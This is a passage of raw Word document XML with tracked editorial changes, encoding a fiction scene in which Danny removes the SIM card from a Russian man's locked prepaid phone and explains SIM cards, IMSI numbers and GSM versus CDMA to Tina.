          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>That’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> what upset you? Him texting while he was supposed to be giving you his undivided attention?”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no, not really; I was, in fact, just a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>little</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> more upset about the gun,” Tina </w:t>
      </w:r>
      <w:ins w:id="1765" w:author="TextVet" w:date="2016-03-19T15:33:00Z">
        <w:r w:rsidR="00580912">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>conceded,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1766" w:author="TextVet" w:date="2016-03-19T15:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00580912">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> smil</w:t>
      </w:r>
      <w:ins w:id="1767" w:author="TextVet" w:date="2016-03-19T15:33:00Z">
        <w:r w:rsidR="00580912">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1768" w:author="TextVet" w:date="2016-03-19T15:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00580912">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“But still. How </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rude</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!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w:t>
      </w:r>
      <w:del w:id="1769" w:author="TextVet" w:date="2016-03-19T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC6966">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">suddenly </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1770" w:author="TextVet" w:date="2016-03-19T15:34:00Z">
        <w:r w:rsidR="00FC6966">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>brightened</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1771" w:author="TextVet" w:date="2016-03-19T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC6966">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>lit up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Oh! Speaking of that phone</w:t>
      </w:r>
      <w:ins w:id="1772" w:author="TextVet" w:date="2016-03-19T15:36:00Z">
        <w:r w:rsidR="0092162B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1773" w:author="TextVet" w:date="2016-03-19T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0092162B">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774" w:author="TextVet" w:date="2016-03-19T15:36:00Z">
        <w:r w:rsidR="0092162B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>d</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1775" w:author="TextVet" w:date="2016-03-19T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0092162B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>D</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o you still have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but it’s locked,” Tina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smirked. “Oh</w:t>
      </w:r>
      <w:ins w:id="1776" w:author="TextVet" w:date="2016-03-19T15:35:00Z">
        <w:r w:rsidR="00105E36">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really?”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checked it on our way to Nat’s place. You need a password</w:t>
      </w:r>
      <w:del w:id="1777" w:author="TextVet" w:date="2016-03-19T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A3170">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to get into it</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laughed. “We’ll see about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reached into her purse and fished out the Russian’s </w:t>
      </w:r>
      <w:ins w:id="1778" w:author="TextVet" w:date="2016-03-19T15:37:00Z">
        <w:r w:rsidR="00C104BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">slim </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">phone. </w:t>
      </w:r>
      <w:del w:id="1779" w:author="TextVet" w:date="2016-03-19T15:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C104BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>It was slim, with a</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1780" w:author="TextVet" w:date="2016-03-19T15:38:00Z">
        <w:r w:rsidR="00C104BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> squat screen </w:t>
      </w:r>
      <w:ins w:id="1781" w:author="TextVet" w:date="2016-03-19T15:38:00Z">
        <w:r w:rsidR="00C104BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">sneered </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:ins w:id="1782" w:author="TextVet" w:date="2016-03-19T15:38:00Z">
        <w:r w:rsidR="00C104BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>bove</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1783" w:author="TextVet" w:date="2016-03-19T15:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C104BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>nd</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a full QWERTY keyboard.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took it with an evil gleam in his eye. “I bet you think this is a BlackBerry,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shrugged.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“Well it’s not. This is a Pantech. AT&amp;T sells them as part of a GoPhone package —where you pay cash up front and your name never shows up on any phone records. In </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>other words, this is a disposable phone. And it’s a good one for the price, really. Supports MMS, BlueTooth, email, web browsing, GPS…”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“So what can you do with it?” Tina </w:t>
      </w:r>
      <w:ins w:id="1784" w:author="TextVet" w:date="2016-03-20T09:40:00Z">
        <w:r w:rsidR="005652DD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>asked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1785" w:author="TextVet" w:date="2016-03-20T09:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005652DD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, skeptical but eager.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pressed the phone’s Power key. The screen greeted him with a tall rectangle with one clipped corner, with a gold square in the middle. A prompt read, “PIN Code”, with an empty box awaiting a number.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“Plenty,” h</w:t>
      </w:r>
      <w:ins w:id="1786" w:author="TextVet" w:date="2016-03-20T09:41:00Z">
        <w:r w:rsidR="00652E5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>is</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1787" w:author="TextVet" w:date="2016-03-20T09:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00652E5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e said with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1788" w:author="TextVet" w:date="2016-03-20T09:42:00Z">
        <w:r w:rsidR="00C54EE8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>vengeful</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1789" w:author="TextVet" w:date="2016-03-20T09:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C54EE8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sinister</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> grin</w:t>
      </w:r>
      <w:ins w:id="1790" w:author="TextVet" w:date="2016-03-20T09:41:00Z">
        <w:r w:rsidR="00652E5D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> replied</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “See, there’s basically two different ways to lock a SmartPhone like this. The lock can apply either to the phone itself, or to the removable SIM card inside it. Locking the phone protects all of the data stored on it — emails, photos, contact lists, that kind of thing. Locking the SIM prevents cha</w:t>
      </w:r>
      <w:ins w:id="1791" w:author="TextVet" w:date="2016-03-20T09:43:00Z">
        <w:r w:rsidR="00F618F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1792" w:author="TextVet" w:date="2016-03-20T09:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F618F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>r</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ges to the phone </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1793" w:author="TextVet" w:date="2016-03-20T09:43:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>number</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — like voice minutes, text messages, and data usage. Now, our Russian friend here chose to lock the SIM, which means we can’t use this phone for placing calls pretending to be him. What we </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> do, though, is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flipped the phone over, unlatched the rear cover, and pried out the battery. Behind the hollow space sat a small plastic card about the size of a thumbnail, rectangular with one clipped corner. The card was white with blue and orange markings reading, “AT&amp;T Go”. Danny pulled the </w:t>
      </w:r>
      <w:del w:id="1794" w:author="TextVet" w:date="2016-03-20T09:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B171BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">small </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>card out, revealing a gold square embedded in its underside. “He won’t be needing this anymore…”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the SIM card, right?” Tina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“Yeah,” said Danny as he slid the </w:t>
      </w:r>
      <w:ins w:id="1795" w:author="TextVet" w:date="2016-03-20T09:45:00Z">
        <w:r w:rsidR="001F6813">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>tiny</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1796" w:author="TextVet" w:date="2016-03-20T09:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001F6813">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>small</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> piece of plastic into his pocket. “It tells your phone who you are. It holds the Subscriber Identity Module — basically a tiny computer built right into the card. The microchip stores a secret code called your IMSI — your International Mobile Subscriber Identity. Your cellular service provider, like AT&amp;T, links your IMSI to your account information — what your balance is, how many minutes you have left this month, that kind of thing. It’s a clever little system that lets customers upgrade their phones while still keeping the same phone number — you just pop your SIM card out of one phone and into another, and your phone number and account info go where the SIM goes.”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all cellphones have one?” Tina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“Well, no,” Danny answered. “It depends on the kind of cellular technology they use. SIM cards are currently specific to GSM. My own phone is on Verizon, which uses CDMA, so it doesn’t. But yours… You’ve got an iPhone, right? On AT&amp;T?”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she said hesitantly.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“Sweet.” He made grabbing motions with his hand. “Gimme.”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reluctantly handed him her iPhone. “I hope you know what you’re doing.”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scanned the Rite Aid. “Now, I just need…” Suddenly, still holding both cellphones, he jumped away from the checkout counter and made a quick dash for an aisle of stationery and school supplies.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“Hey! Where are you going with my phone!” Tina demanded.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hopped back to the counter. “…</w:t>
      </w:r>
      <w:ins w:id="1797" w:author="TextVet" w:date="2016-03-20T09:48:00Z">
        <w:r w:rsidR="00015BFF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1798" w:author="TextVet" w:date="2016-03-20T09:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00015BFF">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 xml:space="preserve">his!” he said, </w:t>
      </w:r>
      <w:del w:id="1799" w:author="TextVet" w:date="2016-03-20T09:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E5975">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">triumphantly </w:t>
      </w:r>
      <w:ins w:id="1800" w:author="TextVet" w:date="2016-03-20T09:50:00Z">
        <w:r w:rsidR="006E5975">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>twiddling</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1801" w:author="TextVet" w:date="2016-03-20T09:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E5975">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>held up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a partially unbent </w:t>
      </w:r>
      <w:del w:id="1802" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1803" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</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don’t think I like where this is going,” Tina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“It’s okay,” Danny </w:t>
      </w:r>
      <w:ins w:id="1804" w:author="TextVet" w:date="2016-03-20T09:52:00Z">
        <w:r w:rsidR="005F007F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>assured</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1805" w:author="TextVet" w:date="2016-03-20T09:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005F007F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, turning Tina’s phone around in his hand. “Everything will be juuuuust…”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found a tiny, almost invisible hole along the edge of the iPhone. Tina watched in fascinated horror as he took the unwound end of the </w:t>
      </w:r>
      <w:del w:id="1806" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE740F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>paper clip</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1807" w:author="TextVet" w:date="2016-03-20T10:32:00Z">
        <w:r w:rsidR="00CE740F">
          <w:rPr>
